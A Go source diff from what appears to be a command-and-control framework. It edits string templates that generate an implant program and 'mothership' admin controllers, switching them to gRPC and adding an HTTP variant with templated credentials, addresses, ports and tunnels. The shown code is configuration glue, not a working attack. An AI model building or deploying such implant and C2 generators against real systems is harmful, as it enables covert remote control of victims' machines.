@@ -33,12 +33,12 @@ var Mule = `
       TunnelAddress: "{{.TunnelAddress}}",
       ISession: session,
     }
-    implant.RunImplant()
+    implant.RunGRPCImplant()
   }
   func main(){}
   `
 
-var AdminTempl = `
+var AdminGRPC = `
 package main
 
 import (
@@ -64,7 +64,36 @@ func main(){
   var ad = lib.AdminData{
     Ad: ac2,
   }
-  ad.RunMothership()
+  ad.RunMothershipGRPC()
+}
+`
+var AdminHTTP = `
+package main
+
+import (
+  "fmt"
+  "odin/lib/c2"
+  "odin/wheagle/server/lib"
+)
+
+func main(){
+  fmt.Println("Are even incide here!!!!!!!!!!!!!!")
+  var ac2 = &c2.AdminC2{
+    Name: "{{.Name}}",
+    Password: "{{.Password}}",
+    MSId: "{{.MSId}}",
+    Address: "{{.Address}}",
+    OPort: {{.OPort}},
+    OProtocol: "{{.OProtocol}}",
+    ImplantPort: {{.ImplantPort}},
+    ImplantProtocol: "{{.ImplantProtocol}}",
+    ImplantTunnel: "{{.ImplantTunnel}}",
+    AdminTunnel: "{{.AdminTunnel}}",
+  }
+  var ad = lib.AdminData{
+    Ad: ac2,
+  }
+  ad.RunMothershipHTTP()
 }
 `
 
